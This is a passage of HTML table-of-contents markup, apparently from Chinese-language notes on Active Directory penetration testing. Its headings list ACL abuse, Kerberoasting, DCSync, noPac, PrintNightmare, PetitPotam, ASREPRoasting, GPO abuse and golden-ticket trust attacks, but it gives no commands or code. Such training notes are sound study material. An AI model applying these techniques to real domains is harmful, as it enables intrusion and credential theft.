class="toc-text">ACL滥用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ACL-%E6%9E%9A%E4%B8%BE"><span class="toc-number">6.1.</span> <span class="toc-text">ACL 枚举</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-PowerView-%E6%9E%9A%E4%B8%BE-ACL"><span class="toc-number">6.1.1.</span> <span class="toc-text">使用 PowerView 枚举 ACL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-Get-DomainObjectACL"><span class="toc-number">6.1.2.</span> <span class="toc-text">使用 Get-DomainObjectACL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%A7%E8%A1%8C%E5%8F%8D%E5%90%91%E6%90%9C%E7%B4%A2%E4%B8%8E%E6%98%A0%E5%B0%84%E5%88%B0-GUID-%E5%80%BC"><span class="toc-number">6.1.3.</span> <span class="toc-text">执行反向搜索与映射到 GUID 值</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Using-the-ResolveGUIDs-Flag"><span class="toc-number">6.1.4.</span> <span class="toc-text">Using the -ResolveGUIDs Flag</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%9B%E5%BB%BA%E5%9F%9F%E7%94%A8%E6%88%B7%E5%88%97%E8%A1%A8"><span class="toc-number">6.1.5.</span> <span class="toc-text">创建域用户列表</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E4%B8%AA%E6%9C%89%E7%94%A8%E7%9A%84-foreach-%E5%BE%AA%E7%8E%AF"><span class="toc-number">6.1.6.</span> <span class="toc-text">一个有用的 foreach 循环</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-damundsen-%E8%BF%9B%E4%B8%80%E6%AD%A5%E6%9E%9A%E4%B8%BE%E6%9D%83%E9%99%90"><span class="toc-number">6.1.7.</span> <span class="toc-text">使用 damundsen 进一步枚举权限</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-Get-DomainGroup-%E8%B0%83%E6%9F%A5Help-Level-1-Group"><span class="toc-number">6.1.8.</span> <span class="toc-text">使用 Get-DomainGroup 调查Help Level 1 Group</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B0%83%E6%9F%A5Information-Technology-Group"><span class="toc-number">6.1.9.</span> <span class="toc-text">调查Information Technology Group</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%BB%E6%89%BE%E6%9C%89%E8%B6%A3%E7%9A%84%E8%AE%BF%E9%97%AE"><span class="toc-number">6.1.10.</span> <span class="toc-text">寻找有趣的访问</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ACL-%E6%BB%A5%E7%94%A8%E7%AD%96%E7%95%A5"><span class="toc-number">6.2.</span> <span class="toc-text">ACL 滥用策略</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%9B%E5%BB%BA-PSCredential-%E5%AF%B9%E8%B1%A1"><span class="toc-number">6.2.1.</span> <span class="toc-text">创建 PSCredential 对象</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AA-SecureString-%E5%AF%B9%E8%B1%A1"><span class="toc-number">6.2.2.</span> <span class="toc-text">创建一个 SecureString 对象</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9B%B4%E6%94%B9%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81"><span class="toc-number">6.2.3.</span> <span class="toc-text">更改用户密码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-damundsen-%E5%88%9B%E5%BB%BA-SecureString-%E5%AF%B9%E8%B1%A1"><span class="toc-number">6.2.4.</span> <span class="toc-text">使用 damundsen 创建 SecureString 对象</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%86-damundsen-%E6%B7%BB%E5%8A%A0%E5%88%B0Help-Desk-Level-1-Group"><span class="toc-number">6.2.5.</span> <span class="toc-text">将 damundsen 添加到Help Desk Level 1 Group</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%9B%E5%BB%BA%E8%99%9A%E5%81%87-SPN"><span class="toc-number">6.2.6.</span> <span class="toc-text">创建虚假 SPN</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-Rubeus-%E8%BF%9B%E8%A1%8C-Kerberoasting"><span class="toc-number">6.2.7.</span> <span class="toc-text">使用 Rubeus 进行 Kerberoasting</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Cleanup"><span class="toc-number">6.2.8.</span> <span class="toc-text">Cleanup</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%8E-adunn-%E7%9A%84%E8%B4%A6%E6%88%B7%E4%B8%AD%E7%A7%BB%E9%99%A4%E4%BC%AA%E9%80%A0%E7%9A%84-SPN"><span class="toc-number">6.2.8.1.</span> <span class="toc-text">从 adunn 的账户中移除伪造的 SPN</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%8E-Help-Desk-Level-1-Group%E4%B8%AD%E7%A7%BB%E9%99%A4-damundsen"><span class="toc-number">6.2.8.2.</span> <span class="toc-text">从 Help Desk Level 1 Group中移除 damundsen</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DCSync"><span class="toc-number">6.3.</span> <span class="toc-text">DCSync</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B-adunn-%E7%9A%84%E7%BB%84%E6%88%90%E5%91%98%E8%BA%AB%E4%BB%BD-Replication%E6%9D%83%E9%99%90"><span class="toc-number">6.3.1.</span> <span class="toc-text">查看 adunn 的组成员身份&#x2F;Replication权限</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8F%90%E5%8F%96-NTLM-%E5%93%88%E5%B8%8C%E5%92%8C-Kerberos-%E5%AF%86%E9%92%A5"><span class="toc-number">6.3.2.</span> <span class="toc-text">提取 NTLM 哈希和 Kerberos 密钥</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-Get-ADUser-%E8%BF%9B%E8%A1%8C%E8%BF%9B%E4%B8%80%E6%AD%A5%E6%9E%9A%E4%B8%BE"><span class="toc-number">6.3.3.</span> <span class="toc-text">使用 Get-ADUser 进行进一步枚举</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-Get-DomainUser-%E6%A3%80%E6%9F%A5%E5%8F%AF%E9%80%86%E5%8A%A0%E5%AF%86%E9%80%89%E9%A1%B9"><span class="toc-number">6.3.4.</span> <span class="toc-text">使用 Get-DomainUser 检查可逆加密选项</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-runas-exe"><span class="toc-number">6.3.5.</span> <span class="toc-text">使用 runas.exe</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-Mimikatz-%E6%89%A7%E8%A1%8C%E6%94%BB%E5%87%BB"><span class="toc-number">6.3.6.</span> <span class="toc-text">使用 Mimikatz 执行攻击</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Stacking-The-Deck-%E7%A7%AF%E7%B4%AF%E7%89%B9%E6%9D%83%E8%AE%BF%E9%97%AE%E6%9D%83%E9%99%90"><span class="toc-number">7.</span> <span class="toc-text">Stacking The Deck(积累特权访问权限)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%89%B9%E6%9D%83%E8%AE%BF%E9%97%AE"><span class="toc-number">7.1.</span> <span class="toc-text">特权访问</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%9A%E4%B8%BE%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E7%94%A8%E6%88%B7%E7%BB%84"><span class="toc-number">7.1.1.</span> <span class="toc-text">枚举远程桌面用户组</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%9A%E4%B8%BE%E8%BF%9C%E7%A8%8B%E7%AE%A1%E7%90%86%E7%94%A8%E6%88%B7%E7%BB%84"><span class="toc-number">7.1.2.</span> <span class="toc-text">枚举远程管理用户组</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%8E-Windows-Linux-%E5%BB%BA%E7%AB%8B-WinRM-%E4%BC%9A%E8%AF%9D"><span class="toc-number">7.1.3.</span> <span class="toc-text">从 Windows&#x2F;Linux 建立 WinRM 会话</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL-Server-%E7%AE%A1%E7%90%86%E5%91%98"><span class="toc-number">7.1.4.</span> <span class="toc-text">SQL Server 管理员</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-PowerUpSQL-%E6%9E%9A%E4%B8%BE-MSSQL-%E5%AE%9E%E4%BE%8B"><span class="toc-number">7.1.4.1.</span> <span class="toc-text">使用 PowerUpSQL 枚举 MSSQL 实例</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-xp-cmdshell-%E6%9E%9A%E4%B8%BE%E7%B3%BB%E7%BB%9F%E4%B8%AD%E7%9A%84%E6%9D%83%E9%99%90"><span class="toc-number">7.1.4.2.</span> <span class="toc-text">使用 xp_cmdshell 枚举系统中的权限</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Kerberos%E2%80%9C%E5%8F%8C%E8%B7%B3%E2%80%9D%E9%97%AE%E9%A2%98"><span class="toc-number">7.2.</span> <span class="toc-text">Kerberos“双跳”问题</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#PSCredential-%E5%AF%B9%E8%B1%A1"><span class="toc-number">7.2.0.1.</span> <span class="toc-text">PSCredential 对象</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%A8%E5%86%8C-PSSession-%E9%85%8D%E7%BD%AE"><span class="toc-number">7.2.0.2.</span> <span class="toc-text">注册 PSSession 配置</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E6%B2%BF%E6%BC%8F%E6%B4%9E"><span class="toc-number">7.3.</span> <span class="toc-text">前沿漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#NoPac-SamAccountName-Spoofing"><span class="toc-number">7.3.1.</span> <span class="toc-text">NoPac (SamAccountName Spoofing)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-noPac-%E5%AF%B9%E5%86%85%E7%BD%AE%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E6%88%B7%E8%BF%9B%E8%A1%8C-DCSync"><span class="toc-number">7.3.2.</span> <span class="toc-text">使用 noPac 对内置管理员账户进行 DCSync</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PrintNightmare"><span class="toc-number">7.4.</span> <span class="toc-text">PrintNightmare</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9E%9A%E4%B8%BE-MS-RPRN"><span class="toc-number">7.4.0.1.</span> <span class="toc-text">枚举 MS-RPRN</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%94%9F%E6%88%90-DLL-%E8%BD%BD%E8%8D%B7-%E4%BD%BF%E7%94%A8-smbserver-py-%E5%88%9B%E5%BB%BA%E5%85%B1%E4%BA%AB"><span class="toc-number">7.4.0.2.</span> <span class="toc-text">生成 DLL 载荷&#x2F;使用 smbserver.py 创建共享</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PetitPotam-MS-EFSRPC"><span class="toc-number">7.5.</span> <span class="toc-text">PetitPotam (MS-EFSRPC)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%90%AF%E5%8A%A8-ntlmrelayx-py"><span class="toc-number">7.5.0.1.</span> <span class="toc-text">启动 ntlmrelayx.py</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%90%E8%A1%8C-PetitPotam-py"><span class="toc-number">7.5.0.2.</span> <span class="toc-text">运行 PetitPotam.py</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8D%95%E8%8E%B7%E7%94%A8%E4%BA%8E-DC01-%E7%9A%84-Base64-%E7%BC%96%E7%A0%81%E8%AF%81%E4%B9%A6"><span class="toc-number">7.5.0.3.</span> <span class="toc-text">捕获用于 DC01 的 Base64 编码证书</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-gettgtpkinit-py-%E8%AF%B7%E6%B1%82-TGT"><span class="toc-number">7.5.0.4.</span> <span class="toc-text">使用 gettgtpkinit.py 请求 TGT</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AE%BE%E7%BD%AE-KRB5CCNAME-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F"><span class="toc-number">7.5.0.5.</span> <span class="toc-text">设置 KRB5CCNAME 环境变量</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8-TGT-%E8%BF%9B%E8%A1%8C-DCSync"><span class="toc-number">7.5.0.6.</span> <span class="toc-text">使用域控制器 TGT 进行 DCSync</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%90%E8%A1%8C-klist"><span class="toc-number">7.5.0.7.</span> <span class="toc-text">运行 klist</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A1%AE%E8%AE%A4%E5%AF%B9%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E7%9A%84%E7%AE%A1%E7%90%86%E5%91%98%E8%AE%BF%E9%97%AE%E6%9D%83%E9%99%90"><span class="toc-number">7.5.0.8.</span> <span class="toc-text">确认对域控制器的管理员访问权限</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-getnthash-py-%E4%B8%BA%E8%87%AA%E5%B7%B1%E6%8F%90%E4%BA%A4-TGS-%E8%AF%B7%E6%B1%82"><span class="toc-number">7.5.0.9.</span> <span class="toc-text">使用 getnthash.py 为自己提交 TGS 请求</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8-NTLM-%E5%93%88%E5%B8%8C%E8%BF%9B%E8%A1%8C-DCSync"><span class="toc-number">7.5.0.10.</span> <span class="toc-text">利用域控制器 NTLM 哈希进行 DCSync</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AF%B7%E6%B1%82-TGT-%E5%B9%B6%E4%BD%BF%E7%94%A8-DC01-%E6%9C%BA%E5%99%A8%E8%B4%A6%E6%88%B7%E6%89%A7%E8%A1%8C-PTT"><span class="toc-number">7.5.0.11.</span> <span class="toc-text">请求 TGT 并使用 DC01$机器账户执行 PTT</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A1%AE%E8%AE%A4%E7%A5%A8%E6%8D%AE%E5%9C%A8%E5%86%85%E5%AD%98%E4%B8%AD"><span class="toc-number">7.5.0.12.</span> <span class="toc-text">确认票据在内存中</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-Mimikatz-%E6%89%A7%E8%A1%8C-DCSync"><span class="toc-number">7.5.0.13.</span> <span class="toc-text">使用 Mimikatz 执行 DCSync</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%82%E9%A1%B9%E9%85%8D%E7%BD%AE%E9%94%99%E8%AF%AF"><span class="toc-number">7.6.</span> <span class="toc-text">杂项配置错误</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%93%E5%8D%B0%E6%9C%BA%E6%BC%8F%E6%B4%9E"><span class="toc-number">7.6.1.</span> <span class="toc-text">打印机漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9E%9A%E4%B8%BE-MS-PRN-%E6%89%93%E5%8D%B0%E6%9C%BA%E6%BC%8F%E6%B4%9E"><span class="toc-number">7.6.1.1.</span> <span class="toc-text">枚举 MS-PRN 打印机漏洞</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%97%85%E6%8E%A2-LDAP-%E5%87%AD%E6%8D%AE"><span class="toc-number">7.6.2.</span> <span class="toc-text">嗅探 LDAP 凭据</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%9A%E4%B8%BE-DNS-%E8%AE%B0%E5%BD%95"><span class="toc-number">7.6.3.</span> <span class="toc-text">枚举 DNS 记录</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-adidnsdump"><span class="toc-number">7.6.3.1.</span> <span class="toc-text">使用 adidnsdump</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-r-%E9%80%89%E9%A1%B9%E8%A7%A3%E6%9E%90%E6%9C%AA%E7%9F%A5%E8%AE%B0%E5%BD%95"><span class="toc-number">7.6.3.2.</span> <span class="toc-text">使用 -r 选项解析未知记录</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E9%85%8D%E7%BD%AE%E9%94%99%E8%AF%AF"><span class="toc-number">7.6.4.</span> <span class="toc-text">其他配置错误</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-Get-DomainUser-%E5%9C%A8%E6%8F%8F%E8%BF%B0%E5%AD%97%E6%AE%B5%E4%B8%AD%E6%9F%A5%E6%89%BE%E5%AF%86%E7%A0%81"><span class="toc-number">7.6.4.1.</span> <span class="toc-text">使用 Get-DomainUser 在描述字段中查找密码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-Get-DomainUser-%E6%A3%80%E6%9F%A5-PASSWD-NOTREQD-%E8%AE%BE%E7%BD%AE"><span class="toc-number">7.6.4.2.</span> <span class="toc-text">使用 Get-DomainUser 检查 PASSWD_NOTREQD 设置</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%91%E7%8E%B0%E4%B8%80%E4%B8%AA%E6%9C%89%E8%B6%A3%E7%9A%84%E8%84%9A%E6%9C%AC"><span class="toc-number">7.6.4.3.</span> <span class="toc-text">发现一个有趣的脚本</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9C%A8%E8%84%9A%E6%9C%AC%E4%B8%AD%E6%9F%A5%E6%89%BE%E5%AF%86%E7%A0%81"><span class="toc-number">7.6.4.4.</span> <span class="toc-text">在脚本中查找密码</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%84%E7%AD%96%E7%95%A5%E9%A6%96%E9%80%89%E9%A1%B9-GPP-%E5%AF%86%E7%A0%81"><span class="toc-number">7.6.5.</span> <span class="toc-text">组策略首选项(GPP)密码</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-CrackMapExec-%E7%9A%84-gpp-autologin-%E6%A8%A1%E5%9D%97"><span class="toc-number">7.6.5.1.</span> <span class="toc-text">使用 CrackMapExec 的 gpp_autologin 模块</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ASREPRoasting"><span class="toc-number">7.6.6.</span> <span class="toc-text">ASREPRoasting</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-Get-DomainUser-%E6%9E%9A%E4%B8%BE-DONT-REQ-PREAUTH-%E5%80%BC"><span class="toc-number">7.6.6.1.</span> <span class="toc-text">使用 Get-DomainUser 枚举 DONT_REQ_PREAUTH 值</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-Rubeus-%E4%BB%A5%E6%AD%A3%E7%A1%AE%E6%A0%BC%E5%BC%8F%E6%A3%80%E7%B4%A2-AS-REP"><span class="toc-number">7.6.6.2.</span> <span class="toc-text">使用 Rubeus 以正确格式检索 AS-REP</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-Kerbrute-%E8%8E%B7%E5%8F%96-AS-REP"><span class="toc-number">7.6.6.3.</span> <span class="toc-text">使用 Kerbrute 获取 AS-REP</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%97%A0%E9%9C%80%E9%A2%84%E8%AE%A4%E8%AF%81%E7%9A%84-Kerberoast-%E7%94%A8%E6%88%B7%E7%8B%A9%E7%8C%8E"><span class="toc-number">7.6.6.4.</span> <span class="toc-text">无需预认证的 Kerberoast 用户狩猎</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%84%E7%AD%96%E7%95%A5%E5%AF%B9%E8%B1%A1%EF%BC%88GPO%EF%BC%89%E6%BB%A5%E7%94%A8"><span class="toc-number">7.6.7.</span> <span class="toc-text">组策略对象（GPO）滥用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-PowerView-%E6%9E%9A%E4%B8%BE-GPO-%E5%90%8D%E7%A7%B0"><span class="toc-number">7.6.7.1.</span> <span class="toc-text">使用 PowerView 枚举 GPO 名称</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E5%86%85%E7%BD%AE-Cmdlet-%E6%9E%9A%E4%B8%BE-GPO-%E5%90%8D%E7%A7%B0"><span class="toc-number">7.6.7.2.</span> <span class="toc-text">使用内置 Cmdlet 枚举 GPO 名称</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9E%9A%E4%B8%BE%E5%9F%9F%E7%94%A8%E6%88%B7%E7%BB%84%E7%AD%96%E7%95%A5%E6%9D%83%E9%99%90"><span class="toc-number">7.6.7.3.</span> <span class="toc-text">枚举域用户组策略权限</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B0%86-GPO-GUID-%E8%BD%AC%E6%8D%A2%E4%B8%BA%E5%90%8D%E7%A7%B0"><span class="toc-number">7.6.7.4.</span> <span class="toc-text">将 GPO GUID 转换为名称</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%8B%BF%E4%B8%8B%E4%B8%80%E4%B8%AA%E5%9F%9F%E5%90%8E%EF%BC%8C%E5%90%91%E7%9D%80%E5%85%B6%E4%BB%96%E5%9F%9F%E8%BF%9B%E6%94%BB"><span class="toc-number">8.</span> <span class="toc-text">拿下一个域后，向着其他域进攻</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%9F%E4%BF%A1%E4%BB%BB%E6%A6%82%E8%BF%B0"><span class="toc-number">8.1.</span> <span class="toc-text">域信任概述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%9A%E4%B8%BE%E4%BF%A1%E4%BB%BB%E5%85%B3%E7%B3%BB"><span class="toc-number">8.2.</span> <span class="toc-text">枚举信任关系</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-Get-ADTrust"><span class="toc-number">8.2.1.</span> <span class="toc-text">使用 Get-ADTrust</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-Get-DomainTrust-%E6%A3%80%E6%9F%A5%E7%8E%B0%E6%9C%89%E4%BF%A1%E4%BB%BB%E5%85%B3%E7%B3%BB"><span class="toc-number">8.2.2.</span> <span class="toc-text">使用 Get-DomainTrust 检查现有信任关系</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-Get-DomainTrustMapping"><span class="toc-number">8.2.3.</span> <span class="toc-text">使用 Get-DomainTrustMapping</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-Get-DomainUser-%E6%A3%80%E6%9F%A5%E5%AD%90%E5%9F%9F%E4%B8%AD%E7%9A%84%E7%94%A8%E6%88%B7"><span class="toc-number">8.2.4.</span> <span class="toc-text">使用 Get-DomainUser 检查子域中的用户</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-netdom-%E6%9F%A5%E8%AF%A2%E5%9F%9F%E4%BF%A1%E4%BB%BB"><span class="toc-number">8.2.5.</span> <span class="toc-text">使用 netdom 查询域信任</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-netdom-%E6%9F%A5%E8%AF%A2%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8"><span class="toc-number">8.2.6.</span> <span class="toc-text">使用 netdom 查询域控制器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-netdom-%E6%9F%A5%E8%AF%A2%E5%B7%A5%E4%BD%9C%E7%AB%99%E5%92%8C%E6%9C%8D%E5%8A%A1%E5%99%A8"><span class="toc-number">8.2.7.</span> <span class="toc-text">使用 netdom 查询工作站和服务器</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E5%9F%9F%E4%BF%A1%E4%BB%BB-%E5%AD%90%E5%9F%9F-%E7%88%B6%E5%9F%9F%E4%BF%A1%E4%BB%BB"><span class="toc-number">8.3.</span> <span class="toc-text">攻击域信任 - 子域 -&gt; 父域信任</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-Mimikatz-%E8%8E%B7%E5%8F%96-KRBTGT-%E8%B4%A6%E6%88%B7%E7%9A%84-NT-%E5%93%88%E5%B8%8C"><span class="toc-number">8.3.1.</span> <span class="toc-text">使用 Mimikatz 获取 KRBTGT 账户的 NT 哈希</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-Get-DomainSID"><span class="toc-number">8.3.2.</span> <span class="toc-text">使用 Get-DomainSID</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-Get-DomainGroup-%E8%8E%B7%E5%8F%96%E4%BC%81%E4%B8%9A%E7%AE%A1%E7%90%86%E5%91%98%E7%BB%84%E7%9A%84-SID"><span class="toc-number">8.3.3.</span> <span class="toc-text">使用 Get-DomainGroup 获取企业管理员组的 SID</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-Mimikatz-%E5%88%9B%E5%BB%BA%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE"><span class="toc-number">8.3.4.</span> <span class="toc-text">使用 Mimikatz 创建黄金票据</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-klist-%E7%A1%AE%E8%AE%A4%E5%86%85%E5%AD%98%E4%B8%AD%E7%9A%84-Kerberos-%E7%A5%A8%E6%8D%AE"><span class="toc-number">8.3.5.</span> <span class="toc-text">使用 klist 确认内存中的 Kerberos 票据</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%97%E5%87%BA%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E7%9A%84%E6%95%B4%E4%B8%AA-C-%E7%9B%98"><span class="toc-number">8.3.6.</span> <span class="toc-text">列出域控制器的整个 C:盘</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ExtraSids-%E6%94%BB%E5%87%BB-Rubeus"><span class="toc-number">8.4.</span> <span class="toc-text">ExtraSids 攻击 - Rubeus</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-ls-%E7%A1%AE%E8%AE%A4%E6%97%A0%E8%AE%BF%E9%97%AE%E6%9D%83%E9%99%90%E5%90%8E%E5%86%8D%E8%BF%90%E8%A1%8C-Rubeus"><span class="toc-number">8.4.1.</span> <span class="toc-text">使用 ls 确认无访问权限后再运行 Rubeus</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-Rubeus-%E5%88%9B%E5%BB%BA%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE"><span class="toc-number">8.4.2.</span> <span class="toc-text">使用 Rubeus 创建黄金票据</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-klist-%E7%A1%AE%E8%AE%A4%E7%A5%A8%E6%8D%AE%E5%9C%A8%E5%86%85%E5%AD%98%E4%B8%AD"><span class="toc-number">8.4.3.</span> <span class="toc-text">使用 klist 确认票据在内存中</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%A7%E8%A1%8C-DCSync-%E6%94%BB%E5%87%BB"><span class="toc-number">8.4.4.</span> <span class="toc-text">执行 DCSync 攻击</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" 